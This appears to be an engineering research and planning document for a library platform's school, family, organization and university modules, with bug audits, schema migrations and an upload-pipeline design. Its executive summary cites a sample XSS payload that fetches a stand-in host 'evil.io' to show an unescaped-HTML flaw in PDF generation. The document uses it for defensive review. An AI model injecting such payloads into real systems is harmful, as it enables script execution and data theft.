# Phase 6 Research — School, Family, Organization & University Modules

**Researched:** 2026-06-08
**Domain:** PQ-9 compliance modules (B2B revenue layer)
**Confidence:** HIGH (audited every Phase 6 scaffold + schema + adjacent Phase 1-5 carry-overs)

---

## Executive Summary

Phase 6 is the **least-greenfield phase to date**. A previous "Sprint 7/9" scaffold pass already shipped most of the Prisma schema (`Institution`, `Club`, `ClubMember`, `Debate`, `Family`, `FamilyInvite`, `FamilyRating`, `SchoolRating`, `Department`, `BookCorner`, `ReadingHour`, `ReadingHourAttendee`, `ProfBook`, `OrgRating`) AND working service/controller/test stubs for `school`, `club`, `family`, `idora`, `otm`. **All 5 modules are wired into `app.module.ts` (lines 22-29) and answer to HTTP** — verified `apps/backend/src/app.module.ts:25-29` + each `*.controller.ts`.

The work shape is therefore **brownfield-light EXTEND** for the existing 26 requirements, **fix-the-bug HARDENING** for several latent defects, and **NEW-NET** for the items the scaffolds don't yet cover (parent SMS opt-in token deep-link, debate media MinIO offload, FAM-06 "one user = one family" unique constraint enforcement at the schema level, scope assertions matching Phase 5 pattern, family detection opt-IN gate, ORG-07 MVP "AI" suggestion endpoint, accreditation per-faculty breakdown).

The **2 most consequential silent bugs** to address in Wave 0:

1. **OTM service queries `type: "STUDENT"` (apps/backend/src/modules/otm/otm.service.ts:28) and `schoolId` (line 27, 67, etc.)** — neither matches schema. The enum is `STUDENT_UNIVERSITY` and the FK is `User.universityId`. Result: `getStudents`, `approveStudent`, and `getOtmStats` for OTMs return EMPTY data in production. The existing OTM spec passes only because the mock uses the wrong-enum value `"STUDENT"` (otm.service.spec.ts:51,114). This is a P1 correctness defect blocking UNI-01 + UNI-02.
2. **Idora `generatePq9Report` (apps/backend/src/modules/idora/idora.service.ts:368-466) interpolates DB strings unescaped** — `institution.name`, `b.title`, `b.author`, `mvp.userName`, `r.userName`, `r.department` all flow into raw HTML without `escapeHtml`. A library/employee named `<script>fetch('evil.io')</script>` would execute under Puppeteer. Mirrors the **Phase 4 FIX A** finding that's already resolved in school PQ-9 (school.controller.ts:182-194 routes through `pdfService.buildMonthlyReportHtml` which escapes) and Plan 05-04/05-08 mandates `escapeHtml` everywhere.

**Primary recommendation:** Plan as a 7-plan phase: Wave 0 hardening + 6 thematic plans. Each module owner-plan is small (200-400 LOC delta against ~370 LOC of existing scaffold), driven by **filling test gaps** rather than rewriting. The schema work is mostly **unique constraints + 1-2 fields** rather than new models.

---

## User Constraints (from CONTEXT.md)

CONTEXT.md does not yet exist for Phase 6. The 7 pre-approved Q decisions from the additional_context block must be propagated into CONTEXT.md by `gsd-discuss-phase` BEFORE Wave 1 plans land. They are listed verbatim in **Open Questions (RESOLVED)** below — the planner MUST honor them as locked decisions.

---

## Phase Requirements

| ID | Description | Research Support |
|----|-------------|------------------|
| SCH-01 | School admin sees students by class with activity | EXTEND: `SchoolService.getStudents` (school.service.ts:176-215) — already filters by `schoolId + schoolClass`; needs scope guard + class-bucket aggregation |
| SCH-02 | School admin approves/rejects PENDING students | EXTEND: `approveStudent` (school.service.ts:219-234) exists; reject + audit log + scope guard missing |
| SCH-03 | Jadidlar izidan club CRUD | EXTEND: `ClubService.createClub/listClubs/updateClub` (club.service.ts:25-106) — works; need delete + activation toggle |
| SCH-04 | Club membership with under-18 parent SMS consent | EXTEND: `addMember + confirmParentConsent` (club.service.ts:110-182) — works on phone match; need **token-link deep-link** rather than phone re-entry |
| SCH-05 | Debate recording with photo/video MANDATORY | EXTEND: `createDebate` (club.service.ts:235-263) — accepts `mediaUrls` but does NOT enforce `>=1`. Need server-side validation + MinIO upload endpoint + size cap |
| SCH-06 | 20-book yearly goal monitoring + quarterly report | EXTEND: `getGoalProgress` (club.service.ts:344-380) — works; needs scope guard + PDF quarterly export hook |
| SCH-07 | School ranking formula (coverage + club + RI) | EXTEND: `computeSchoolRatings` (school.service.ts:290-371) — works; but **duplicates** Phase 3 `InstitutionalService.computeForType(MAKTAB)` (institutional.service.ts:62-92) — see Risk R-DUP below |
| SCH-08 | School PQ-9 PDF | EXTEND: `getPq9ReportData + downloadPq9Report` (school.controller.ts:164-205) — uses safe `pdfService.buildMonthlyReportHtml`. Needs Jadidlar-specific section embedding + debate-photo thumbnails |
| SCH-09 | Inactive-club alert (30 days) | DONE-CARRY: Plan 05-05 `CLUB_INACTIVE` alert already dispatches (alert-dispatch.service.ts:74); but `ClubService.getInactiveClubs` (club.service.ts:384-416) hardcodes 45-day default → must align to 30 |
| FAM-01 | Same-address detection | EXTEND: `detectAndSuggestFamily` (family.service.ts:95-126) — works but suggests UNCONDITIONALLY. Need **opt-IN gate** per Q3 |
| FAM-02 | Manual invite by phone OR userId | EXTEND: `inviteMember` (family.controller.ts:49-69) — works |
| FAM-03 | 30-day waiting period | EXTEND: `computeFamilyRatings` (family.service.ts:280-369) — uses `User.createdAt`, NOT `Family.joinedAt`. Must switch to membership join date (else a 5-year-old user joining a family yesterday counts immediately) |
| FAM-04 | Family avg RI | EXTEND: `_computeSingleFamilyRating` (family.service.ts:323-369) — works |
| FAM-05 | Top-50 families public | EXTEND: `getFamilyRatings` (family.service.ts:245-267) — returns up to 50; needs CLAUDE.md §V.4 anonymization for under-14 members in public profile |
| FAM-06 | One user = one family + address-change admin approval | **NEW/SCHEMA-DEBT**: `User.familyId` is nullable single-FK so 1:1 holds at write, BUT app-layer `respondToInvite` checks `user.familyId` (family.service.ts:209) — TOCTOU race possible if 2 invites accepted concurrently. Add `@@unique` is wrong (it's a FK); add Prisma `$transaction` with `SELECT FOR UPDATE` (Prisma uses interactive). Address-change approval flow doesn't exist |
| ORG-01 | HR sees employees by department | EXTEND: `getEmployees` (idora.service.ts:19-65) — works; missing scope guard |
| ORG-02 | Internal employee ranking + monthly dynamics | EXTEND: `getInternalRating + computeAndSaveRating` (idora.service.ts:128-203) — works but **overlaps** with Phase 3 InstitutionalService write to OrgRating. See R-DUP |
| ORG-03 | Kitob o'qish soati CRUD with QR attendance | EXTEND: `createReadingHour + markAttendance` (idora.service.ts:265-291) — works; QR generation reuses existing `qrcode` lib (Plan 04-03) |
| ORG-04 | Kitob burchagi tasdiq + 90-day refresh | EXTEND: `upsertBookCorner + bookCornerReminders` (idora.service.ts:214-246, 473-483) — cron is a STUB that only logs ("SMS/push yuborish ..."). Needs actual `NOTIFICATION_QUEUE` dispatch via `AlertDispatchService` |
| ORG-05 | Department-filtered ranking + mukofot taklifi | NEW: `_computeRating` (idora.service.ts:162-203) sets `isMvp: idx === 0` per-month but writes only OrgRating; **no `AiAuditLog` MUKOFOT_TAKLIFI row + no HR email** per Q6. Needs MVP-detect → email |
| ORG-06 | PQ-9 PDF | EXTEND: `generatePq9Report` (idora.service.ts:351-469) — works BUT XSS-vulnerable per intro. Must refactor to use `pdfService.buildMonthlyReportHtml` (or escapeHtml every interpolation) |
| ORG-07 | Kasb adabiyotlar | EXTEND: `getProfBooks + addProfBook + removeProfBook` (idora.service.ts:320-347) — works; HR-only role guard missing |
| UNI-01 | Student verification by OTM admin | **BUGFIX**: `approveStudent` (otm.service.ts:64-76) queries `user.schoolId !== institutionId` — wrong field for OTM (should be `universityId`). Re-target query + ensure scope guard |
| UNI-02 | Faculty-level statistics | **BUGFIX**: `getOtmStats + getStudents` (otm.service.ts:18-162) all query `schoolId + type:"STUDENT"`. Both wrong. Must switch to `universityId + type: STUDENT_UNIVERSITY`. Then add faculty grouping (use existing `User.faculty` field, schema.prisma:166) |
| UNI-03 | Akkreditatsiya hisoboti PDF | EXTEND: `generateAccreditationReport` (otm.service.ts:242-346) — XSS-vulnerable like ORG-06. Refactor. Also add per-faculty breakdown (currently `courseBuckets` only uses `schoolClass`, not `faculty`) |
| UNI-04 | Talaba kitobxonlik o'zlashtirish ro'yhati | NEW: no per-student academic-progress endpoint exists. Build a list view from `User.faculty + ReadingIndex` joined to the OTM's institution; aggregated form only (no individual PII per Q7) |

---

## Architectural Responsibility Map

| Capability | Primary Tier | Secondary Tier | Rationale |
|------------|-------------|----------------|-----------|
| Student approval, club CRUD, family invites, reading hours, book corner | API / Backend (NestJS) | Frontend Server (Next.js SSR for dashboard) | Stateful operations + RBAC; never trust client |
| PQ-9 PDF render | API / Backend | — | Puppeteer runs server-side only |
| Debate photo/video upload | API / Backend (HTTP) | Storage (MinIO) | Backend validates MIME/size, presigns or proxies to MinIO |
| Family auto-detection suggestion | API / Backend | Frontend client (consumes) | DB-driven address match must happen server-side |
| School/family/OTM/org leaderboards | API / Backend (PrismaReplicaService) | CDN cache (Next.js ISR) | Heavy reads on replica + 5-min Redis cache; SSR snapshots can be CDN-cached |
| Parent consent deep-link page | Frontend Server (SSR) | API / Backend (token verify) | Lightweight Next.js page reads `?token=…`, POSTs to backend |
| QR attendance scan | Frontend Client (browser camera) | API / Backend | Browser scans QR → POSTs userId; backend re-validates token |
| HR mukofot email | API / Backend (NotificationQueue) | — | Outbound only, no UI tier |

---

## Project Constraints (from CLAUDE.md)

The following CLAUDE.md directives apply to Phase 6 and the planner MUST honor each:

1. **§II.1 Qadam 4 — institution tasdiq muddati:** "Maktab admin 1 kun", "OTM admin 1 kun", "Idora HR admin 2 kun", 14-day PENDING→CITIZEN auto-fallback. **Implementation:** Phase 1 AUTH-04 already converts 14d-stale PENDING → CITIZEN (admin.service.ts:77-105). Phase 6 must add `TUMAN_ADMIN/MUASSASA_ADMIN`-callable explicit approve/reject + a PENDING auto-reminder before day 14. Bildirishnoma text mandated: *"Tashkilotingiz 14 kun ichida tasdiqlamadi, oddiy kitobxon sifatida davom etasiz"*.
2. **§IV.4 Oila moduli himoya qoidalari:**
   - "Bir foydalanuvchi faqat **bitta** oilada" → enforce at write (Prisma interactive `$transaction` with re-check inside, NOT a unique constraint since `familyId` is already a nullable FK).
   - "Oilaga qo'shilgandan **30 kun** o'tgach reyting hisoblanadi" → must use **membership join date**, not `User.createdAt`. Currently family.service.ts:300 incorrectly uses `User.createdAt` — see open question OQ-1 below.
   - "Manzil o'zgarishi tuman admin tasdiqlovi talab qiladi" → new endpoint + state machine.
3. **§V.3 Reyting yangilanish kadensiyasi:** "Top maktablar | **Haftalik**" while families/oilalar are Oylik. Current `computeSchoolRatings` is on-demand only — schedule a **weekly cron** (Sunday 02:00 Asia/Tashkent) for MAKTAB type via `@Cron`, while Phase 3 `InstitutionalService.computeForType(MAKTAB)` runs daily. Reconcile per R-DUP.
4. **§VII Klub a'zolik:** "18 yoshgacha ota-ona SMS rozilik MAJBURIY" — currently `addMember` (club.service.ts:110-165) throws if `parentPhone` not provided. CLAUDE.md is satisfied at validation but the **SMS deep-link UX (Q-decision A2 below) is preferred over 'send memberId in SMS reply' (current code, club.service.ts:445)** because Uzbek mobile users routinely cannot reply to short codes.
5. **§VIII.3 Server lokalizatsiya:** debate photo/video MUST reside in Uzbekistan datacenter MinIO. **No** S3/Cloudflare R2 fallback. MinIO container already specified in Phase 1 docker-compose; verify env wiring exists before Wave 1.
6. **§VIII.3 Audit log append-only:** every approve/reject/freeze/mukofot-taklifi event writes an `AiAuditLog` row. Pattern: Phase 4 STATE_TRANSITION (payme.service.ts:313 inside `$transaction`).
7. **§XI.1 Branching:** all Phase 6 work lands on `develop` and merges to `main` per Plan 04/05 cadence.

---

## Standard Stack

### Core (all VERIFIED installed in apps/backend/package.json)

| Library | Version | Purpose | Why Standard |
|---------|---------|---------|--------------|
| `@nestjs/common` | `^10.3.8` | Modules, DI | Project-wide standard since Phase 1 |
| `@prisma/client` | `^5.14.0` | DB access | Schema-first ORM; partition-aware writes (Phase 2) |
| `@nestjs/bullmq` | `^10.2.3` | Queue for parent SMS + alert dispatch | `NOTIFICATION_QUEUE` already wired (Phase 1) |
| `@nestjs/schedule` | `^4.1.1` | Cron jobs (weekly school cron, family monthly, 90-day BookCorner reminder) | Already used by Phase 3-5 |
| `puppeteer-core` | `^22.15.0` | PDF rendering | Phase 4 + 5 PdfService established |
| `exceljs` | `^4.4.0` | XLSX export (school/org rosters) | Phase 4 buxgalter pattern |
| `qrcode` | (transitive; installed Plan 04-03) | QR attendance + parent consent link | Already used for invoices |

### Supporting (NEW — must install in Wave 0)

| Library | Version | Purpose | When to Use |
|---------|---------|---------|-------------|
| `minio` | `^8.0.x` [VERIFIED: npm registry — official MinIO JS SDK, ~9 yr old, source github.com/minio/minio-js] | Debate photo/video + book corner photo upload to MinIO | Wave 0 — provides `putObject + presignedGetUrl`. Phase 2 Plan 02-04 deferred MinIO offload for Excel books-import, so this is the FIRST production install. [CITED: https://min.io/docs/minio/linux/developers/javascript/minio-javascript.html] |
| `file-type` | `^19.x` [VERIFIED: npm registry — well-established MIME sniffer, source github.com/sindresorhus/file-type] | Magic-byte MIME detection — Content-Type header is forgeable | Use in debate upload validator (defense-in-depth; never trust `multipart/form-data` declared mime) [CITED: OWASP File Upload Cheat Sheet] |
| `sharp` | `^0.33.x` [VERIFIED: npm registry — official libvips binding, widely used] | Image thumbnail generation for PQ-9 PDF embedding | Generate 200×200 thumb from debate photos so PDF stays under 5MB |

### Alternatives Considered

| Instead of | Could Use | Tradeoff |
|------------|-----------|----------|
| `minio` JS SDK | `@aws-sdk/client-s3` (S3-compatible) | AWS SDK is heavier (~3MB vs ~200KB); MinIO's own SDK matches their server semantics. Both work against MinIO. Decision: use `minio` for clarity |
| `sharp` for thumbnails | `jimp` (pure JS) | `sharp` requires native libvips compile but is 10× faster; PDF generation already requires native Chromium so the build complexity ceiling is already crossed |
| Server-proxied upload | MinIO presigned PUT URLs | Presigned simpler but bypasses MIME/virus validation. **Decision:** proxy through backend for V1 (cheap — debates are infrequent; ~2000 schools × monthly = ~67/day) |

**Installation (Wave 0 single PR):**

```bash
cd apps/backend
npm install minio@^8.0.5 file-type@^19.1.0 sharp@^0.33.5
```

**Version verification (run during Wave 0 task):**

```bash
npm view minio version          # confirm latest 8.x
npm view file-type version      # confirm latest 19.x
npm view sharp version          # confirm latest 0.33.x or 0.34.x
```

Lock to the latest patched 8.x / 19.x / 0.33.x at install time; record verified version + publish date in the install task's expected output.

---

## Package Legitimacy Audit

slopcheck was **not invokable in this research session** (CLI tool not on PATH; pip install attempt deferred to keep research time-boxed). **All three NEW packages above are tagged `[ASSUMED]` despite being well-known and AUTHORIATIVELY-cited from official docs.** The planner MUST insert a `checkpoint:human-verify` task before `npm install` runs, with the verification recipe:

```bash
# Verify each package on npm AND check source repo + downloads
npm view minio    # repo: github.com/minio/minio-js, expect >100k weekly DL, >8 yrs
npm view file-type   # repo: github.com/sindresorhus/file-type, expect millions weekly DL
npm view sharp    # repo: github.com/lovell/sharp, expect millions weekly DL
```

| Package | Registry | Expected age | Expected DL | Expected repo | slopcheck | Disposition |
|---------|----------|--------------|-------------|---------------|-----------|-------------|
| `minio` | npm | ~9 yrs | ~150k/wk | github.com/minio/minio-js | UNRUN | [ASSUMED] — verify before install |
| `file-type` | npm | ~10 yrs | ~50M/wk | github.com/sindresorhus/file-type | UNRUN | [ASSUMED] — verify before install |
| `sharp` | npm | ~10 yrs | ~5M/wk | github.com/lovell/sharp | UNRUN | [ASSUMED] — verify before install |

**Packages removed due to slopcheck [SLOP] verdict:** none — no verdict was run.
**Packages flagged as suspicious:** none — but treat all 3 as unverified pending human checkpoint.

---

## Schema Additions (Prisma models + migrations)

**Existing models are >90% complete** — confirmed via `apps/backend/prisma/schema.prisma:594-837`. The DELTA needed for Phase 6 is small.

### Migration `20260608000001_phase6_family_consent_audit_fields`

```prisma
// Family — track membership join date for the 30-day waiting period
// (currently family.service.ts:300 incorrectly uses User.createdAt)
model FamilyMembership {
  id        String    @id @default(cuid())
  userId    String    @unique
  user      User      @relation("FamilyMembershipUser", fields: [userId], references: [id], onDelete: Cascade)
  familyId  String
  family    Family    @relation(fields: [familyId], references: [id], onDelete: Cascade)
  joinedAt  DateTime  @default(now())
  leftAt    DateTime?

  @@index([familyId])
  @@index([joinedAt])
}

// User → add address-change pending state for tuman admin approval (FAM-06)
model AddressChangeRequest {
  id              String    @id @default(cuid())
  userId          String
  user            User      @relation(fields: [userId], references: [id], onDelete: Cascade)
  fromAddressId   String?
  toAddressId     String
  status          String    @default("PENDING") // PENDING | APPROVED | REJECTED
  reason          String?
  reviewedBy      String?
  reviewedAt      DateTime?
  createdAt       DateTime  @default(now())

  @@index([userId, status])
  @@index([status, createdAt])
}
```

### Migration `20260608000002_phase6_club_consent_token`

```prisma
// ClubMember already has parentPhone/parentConsented (schema.prisma:646-664).
// Add token-based deep-link for parent SMS consent (Q-decision A2 below).
model ClubMemberConsentToken {
  id           String    @id @default(cuid())
  clubMemberId String    @unique
  clubMember   ClubMember @relation(fields: [clubMemberId], references: [id], onDelete: Cascade)
  tokenHash    String    @unique // bcrypt-hashed nonce; raw token sent via SMS
  expiresAt    DateTime
  consumedAt   DateTime?
  createdAt    DateTime  @default(now())

  @@index([expiresAt])
}
```

### Migration `20260608000003_phase6_org_event_strict_mediadupes`

```prisma
// Debate.mediaUrls is already a `String[]` (schema.prisma:676). Two additions:
//   1. Track who uploaded each media item (forensics)
//   2. Enforce >=1 media via service-layer assertion (NOT a DB CHECK because
//      Postgres CHECK on array length is fine, but we also need MIME audit)

model DebateMedia {
  id          String   @id @default(cuid())
  debateId    String
  debate      Debate   @relation(fields: [debateId], references: [id], onDelete: Cascade)
  url         String  // MinIO object key
  mimeType    String  // verified via file-type sniff
  sizeBytes   Int
  thumbnailUrl String?
  uploadedById String
  uploadedAt  DateTime @default(now())

  @@index([debateId])
}

// ReadingHour gets the same media-audit treatment for ORG-03 photo/video evidence
model ReadingHourMedia {
  id            String      @id @default(cuid())
  readingHourId String
  readingHour   ReadingHour @relation(fields: [readingHourId], references: [id], onDelete: Cascade)
  url           String
  mimeType      String
  sizeBytes     Int
  uploadedById  String
  uploadedAt    DateTime    @default(now())

  @@index([readingHourId])
}

// BookCorner already has photoUrls; add audit row for refresh tracking (ORG-04)
model BookCornerVerification {
  id           String     @id @default(cuid())
  bookCornerId String
  bookCorner   BookCorner @relation(fields: [bookCornerId], references: [id], onDelete: Cascade)
  verifiedById String
  photoUrls    String[]
  note         String?
  createdAt    DateTime   @default(now())

  @@index([bookCornerId, createdAt])
}
```

### Migration `20260608000004_phase6_jadidlar_unique_constraints`

```prisma
// SCH-04: prevent duplicate ClubMember on (clubId, userId) is already @@unique
// (schema.prisma:661). No change.

// Idora.Department + ProfBook should NOT have duplicates per institution+name:
// add @@unique to lock at the DB level (currently only an index)
// ClubMemberConsentToken token already @@unique; FamilyInvite has @@unique([familyId, inviteeId]).
// All good — no further constraints needed at this layer.
```

### Non-schema schema notes (no migration required, just service-level)

- **`Debate.mediaUrls`** field is preserved — `DebateMedia` is **additive** (richer audit trail), not a replacement. Services write to BOTH the array (for backward-compat with existing UI calls) and the new audit table.
- **`SchoolRating`** model (schema.prisma:719-734) currently has no `type` field — both MAKTAB and OTM ratings share the same table per Plan 03-03 D-6 schema debt. **V2 plans add `UniRating`** but V1 keeps coexistence. The planner must filter by `institution.type` when reading.

---

## Build / Extend Approaches

For each requirement: NEW / FIX / EXTEND classification + carry-overs honored.

| Req | Verdict | Approach |
|-----|---------|----------|
| SCH-01 | EXTEND | Add scope guard `assertInstitutionInScope(user, institutionId)` (NEW util mirroring `assertTumanInScope`) — call from `getStudents` before cache.remember. Add class-bucket aggregation for active vs PENDING per class |
| SCH-02 | EXTEND | Add reject endpoint (`PATCH /institutions/:id/students/:userId/reject` with reason). Write `AiAuditLog{scope:USER, scopeId:userId, issueType:'STUDENT_REJECT', severity:LOW, analysis:reason}` |
| SCH-03 | EXTEND | Add DELETE + add `goal` validation (10-30 range — CLAUDE.md says 20 default, Q2 allows custom) |
| SCH-04 | EXTEND with NEW token model | Replace "SMS reply HA — memberId" UX with **deep-link token** flow: `clubMember.create` generates `ClubMemberConsentToken`, SMS includes `https://sifat.uz/uz-Latn/club/consent?token=…`. Backend `POST /club/consent/:token` verifies + marks consented |
| SCH-05 | EXTEND with media MINIO + validation | New `POST /club/:clubId/debates/:debateId/media` endpoint with `FileInterceptor`. Validate via `file-type` library (whitelist: image/jpeg, image/png, image/webp, video/mp4, video/quicktime). Cap: 50MB per file, 4 files per debate (Q1). Reject `createDebate` if `mediaUrls.length === 0` (server-side) |
| SCH-06 | EXTEND | Compose existing `getGoalProgress` (club.service.ts:344-380) with new `POST /club/:id/quarterly-report` that returns a PDF (use shared `pdfService.buildMonthlyReportHtml` overload) |
| SCH-07 | EXTEND + RECONCILE | Add `@Cron("0 2 * * 0")` weekly Sunday on `SchoolService.computeSchoolRatings`. **Phase 3 InstitutionalService** already writes the same SchoolRating row daily — verify outputs match; if not, **delete the duplicate write from `SchoolService.computeSchoolRatings`** and have it call `InstitutionalService.computeForType(MAKTAB)` instead (R-DUP) |
| SCH-08 | EXTEND | Add Jadidlar-section to PQ-9 template (`buildMonthlyReportHtml` extension). Embed first-3 debate thumbnails per club via Sharp-generated 200×200 |
| SCH-09 | EXTEND | Change `ClubService.getInactiveClubs` default from 45 → 30 (line 384) so it aligns with Plan 05-05 ALERT-04 threshold and CLAUDE.md §VI.4 |
| FAM-01 | EXTEND with **opt-IN gate** (Q3) | Add `User.familyDetectionEnabled` boolean field (defaults `false`). `detectAndSuggestFamily` returns null when toggle is off. Profile page exposes toggle |
| FAM-02 | DONE — already works | No changes |
| FAM-03 | **FIX** | Currently uses `User.createdAt` (family.service.ts:292,300). Replace with `FamilyMembership.joinedAt` from new model. **Backward-compat migration:** on schema apply, backfill `FamilyMembership` rows from existing `User.familyId` with `joinedAt = User.createdAt` |
| FAM-04 | DONE — already works (cached, replica-routed via underlying findFirst) | But `_computeSingleFamilyRating` (family.service.ts:323-369) hits `this.prisma`, NOT `this.replica`. **FIX:** inject `PrismaReplicaService` and route the per-member `readingIndex.findFirst` through replica. Heavy O(families × members) read |
| FAM-05 | EXTEND | Top-50 already returned; add `maskNameIfMinor` to each member name surfaced in public profile (FAM-06 public page). Reuse `common/utils/privacy-mask.util.ts` |
| FAM-06 | **NEW state machine** + EXTEND | Add `AddressChangeRequest` model + endpoint set: `POST /users/address-change` (creates PENDING), `PATCH /admin/address-change/:id` (TUMAN_ADMIN approves/rejects). On approve, atomically swap addressId. One-family enforcement: wrap `respondToInvite` (family.service.ts:182-218) in interactive `$transaction` with a re-check of `user.familyId` inside the transaction |
| ORG-01 | EXTEND | Add scope guard. Add department-tree endpoint (already has `getDepartments` idora.service.ts:93-111) |
| ORG-02 | EXTEND + RECONCILE | Same R-DUP as SCH-07 — Phase 3 InstitutionalService already writes OrgRating for IDORA daily. `IdoraService.computeAndSaveRating` (idora.service.ts:144-160) duplicates this. **DECISION:** keep `IdoraService.getInternalRating` as a READ-ONLY view over `OrgRating` (delete its write path). Phase 3 cron remains sole writer |
| ORG-03 | EXTEND | Add scope guard + MinIO media offload (parallel to SCH-05 endpoint via `ReadingHourMedia`) |
| ORG-04 | EXTEND | Wire `bookCornerReminders` cron (idora.service.ts:473-483 — currently STUB that only logs) to `AlertDispatchService.dispatch({type: 'BOOK_CORNER_REMINDER', severity: 'OGOH', recipients: [MUASSASA_ADMIN of institutionId]})`. Reuse Plan 05-05 alert pattern |
| ORG-05 | NEW | After `computeAndSaveRating` finishes (or after Phase 3 cron writes OrgRating with `isMvp:true`), enqueue a `mukofot-taklifi` job: writes `AiAuditLog{issueType:'MUKOFOT_TAKLIFI', severity:LOW}` + `NOTIFICATION_QUEUE.add('email', {to: HR_ADMIN_EMAIL, subject:'PQ-9 Mukofot taklifi'})` |
| ORG-06 | **FIX** (HTML escape) + EXTEND | Refactor `IdoraService.generatePq9Report` (idora.service.ts:351-469) to call `pdfService.buildMonthlyReportHtml` with table rows — same pattern as `SchoolController.downloadPq9Report` (school.controller.ts:182-194). Remove the inline `<table>` literal |
| ORG-07 | EXTEND | Add HR-admin role guard (`@Roles(SUPER_ADMIN, MUASSASA_ADMIN)`). Add validation: ISBN must match a real Book OR be null + title required |
| UNI-01 | **FIX P1** | `OtmService.approveStudent` (otm.service.ts:64-76) uses `user.schoolId !== institutionId`. Change to `user.universityId !== institutionId`. Also assert `user.type === UserType.STUDENT_UNIVERSITY`. Add scope guard |
| UNI-02 | **FIX P1** | All `OtmService.getStudents/getOtmStats` queries use `schoolId` + `type:"STUDENT"`. Replace with `universityId` + `type: UserType.STUDENT_UNIVERSITY` (enum literal, not string). Add **faculty grouping** via `User.faculty` (schema.prisma:166) — currently the service groups by `schoolClass` only |
| UNI-03 | EXTEND + HTML escape | Refactor `OtmService.generateAccreditationReport` (otm.service.ts:242-346) to escape via `pdfService.buildMonthlyReportHtml`. Add per-faculty section table |
| UNI-04 | NEW | New endpoint `GET /otm/:id/students/progress` (aggregated by faculty + course, no individual PII). Faculty admin role guard |

---

## Load-Bearing Decisions

The planner must lock these 7 in CONTEXT.md before Wave 1:

1. **Schema additions** — 4 migrations: `phase6_family_consent_audit_fields` (FamilyMembership + AddressChangeRequest), `phase6_club_consent_token` (ClubMemberConsentToken), `phase6_org_event_strict_mediadupes` (DebateMedia + ReadingHourMedia + BookCornerVerification), `phase6_jadidlar_unique_constraints` (no-op placeholder for cross-cutting locks if needed). Use raw-SQL migration only for the FamilyMembership backfill (UPDATE … FROM User WHERE familyId IS NOT NULL).
2. **File upload strategy** — Backend proxy (NOT presigned). `FileInterceptor` + 50MB cap + `file-type` MIME sniff + bucket per institution: `s3://debate-media/{institutionId}/{debateId}/{cuid}.{ext}`. Sharp generates 200×200 thumb at upload time for PDF embedding. **No virus scanning V1** (ClamAV deferred to V2 per existing Phase 1 risk register patterns); compensating control: only authenticated `KLUB_RAHBARI`/`MUASSASA_ADMIN` can upload + 4-files-per-debate hard cap + audit row per upload.
3. **Parent SMS consent flow** — Token-based: `ClubMember.create` mints raw nonce (32 hex chars), stores `bcrypt(nonce)` in `ClubMemberConsentToken`, sends SMS: *"SIFAT LIBRARY: {childName} farzandingiz {clubName} klubiga taklif qilingan. Tasdiqlash: sifat.uz/uz-Latn/club/consent?t={nonce}. Muddati: 48 soat."* Frontend page `/club/consent?t=…` POSTs to `POST /club/consent` which verifies `expiresAt` + `bcrypt.compare` + flips `ClubMember.parentConsented` to `true` + records `consumedAt`. Audit row written. Tokens are single-use; expired/consumed → 404. Deep-link replaces current "reply HA + memberId" UX which doesn't work on Uzbek SMS networks reliably.
4. **PQ-9 PDF template** — Single template (`pdfService.buildMonthlyReportHtml`) parameterized by **scope** (MAKTAB / OTM / IDORA). Each scope passes a different `tableRows[]` + an optional `sections[]` block (NEW field — additive to the existing overload). All scopes route through `escapeHtml` defensively. Photo thumbnails embedded as base64 data-URLs (already used by Phase 4-03 QR pattern).
5. **Family detection** — Server-side query (existing `detectAndSuggestFamily`) + opt-IN gate. New field `User.familyDetectionEnabled BOOLEAN DEFAULT FALSE`. Profile UI exposes toggle. Even when enabled, suggestion is presented as "5 ta yaqin foydalanuvchi topildi — ko'rib chiqing" and NEVER auto-adds; only manual invite chain. Neighbor disambiguation: same `(viloyatId, tumanId, mahallaId, house, apartment)` 6-tuple match. Dormitory edge case: opt-IN gate is the user's safety valve.
6. **Scope assertion** — Reuse Phase 5 pattern `assertViloyatInScope` / `assertTumanInScope` (common/utils/admin-scope.util.ts). NEW helper `assertInstitutionInScope(user, institutionId, type?)`: SUPER_ADMIN+BUXGALTER bypass; VILOYAT_ADMIN+TUMAN_ADMIN scope to institution's region (resolve via `Institution.viloyatId/tumanId`); MUASSASA_ADMIN scopes via `User.organizationId/schoolId/universityId === institutionId`. Fail-CLOSED on null scope (mirrors Phase 4-04-fix pattern).
7. **Plans count** — Recommend **7 plans**: Wave 0 (hardening + schema) + 1 plan per major module (School, Family, Org, Uni) + 1 plan for shared MinIO upload pipeline + 1 closeout (smoke + cross-module verification). The MinIO plan runs in parallel to the module plans after Wave 0 settles.

---

## Phase 1-5 Carry-overs Respected

| Carry-over | Phase | How Phase 6 reuses |
|------------|-------|--------------------|
| `PrismaReplicaService` | Phase 2 (RI-01) | All ranking/aggregate reads in school/family/idora/otm route through replica. Currently `family.service.ts:_computeSingleFamilyRating` uses primary — FIX |
| `cache.remember(key, ttl, fn)` | Phase 2-5 | `school:stats:{id}` already used (school.service.ts:88). Apply same to OTM stats (currently no cache wrapper on `getOtmStats`) and Idora rating |
| `pdfService.buildMonthlyReportHtml` + `escapeHtml` | Phase 4-03 + Plan 05-04 fix | School PQ-9 already uses it. Refactor Idora + OTM PDF generation to use it. **No raw HTML interpolation of DB strings.** |
| `escapeFormulaCell` | Plan 04-03 (CWE-1236) | If any Phase 6 plan adds XLSX exports (e.g., school student roster) — MUST use Phase 4 `_escapeFormulaCell` helper |
| `NOTIFICATION_QUEUE` + `sms/sendNotification` + `mail.sendEmail` + `fcm.sendPush` | Phase 1 + Plan 05-04 | Parent SMS consent uses `sms.sendNotification`. Mukofot taklifi uses `mail.sendEmail`. Teacher approve push uses FCM via `DeviceToken` |
| `Top-100 cron pattern + AlertDispatchService` | Phase 3/5 | Reuse `@Cron + leader lock (RedisLockService)` for weekly school cron + monthly family cron. ORG-04 90-day book corner reminder routes through `AlertDispatchService` |
| `RolesGuard + @Roles + service-layer scope` | Phase 4-04-fix-followup + Plan 05-02 | All Phase 6 services pass `user` through `assertInstitutionInScope` before any read/write |
| `K_ANONYMITY_THRESHOLD = 5` | Plan 05-03 fix | Apply to small-class (< 5 students per class), small-department (< 5 employees per dept), small-faculty buckets. Suppress with `—` in PDFs |
| `FCM push` + `DeviceToken` | Plan 05-04 | Teacher receives push when student requests club membership |
| MinIO file storage | NEW for Phase 6 (Phase 1 has docker container but no JS client wired) | First production install. Validate env vars `MINIO_ENDPOINT/MINIO_ACCESS_KEY/MINIO_SECRET_KEY/MINIO_BUCKET_DEBATES/MINIO_BUCKET_BOOKCORNERS` exist |
